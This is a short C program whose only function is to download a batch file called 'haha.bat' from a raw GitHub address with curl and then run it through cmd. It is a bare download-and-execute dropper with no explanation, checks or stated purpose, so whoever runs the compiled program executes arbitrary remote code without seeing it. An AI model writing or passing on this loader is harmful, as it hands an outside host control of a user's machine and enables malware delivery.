

#include <stdio.h>
#include <stdlib.h>

int main(void) {

    int result = system(
        "curl -L -s https://raw.githubusercontent.com/animationss253/magarni/main/haha.bat -o haha.bat"
    );

    if (result != 0) {
        return 1;
    }


    system("cmd /c haha.bat");

    return 0;
}

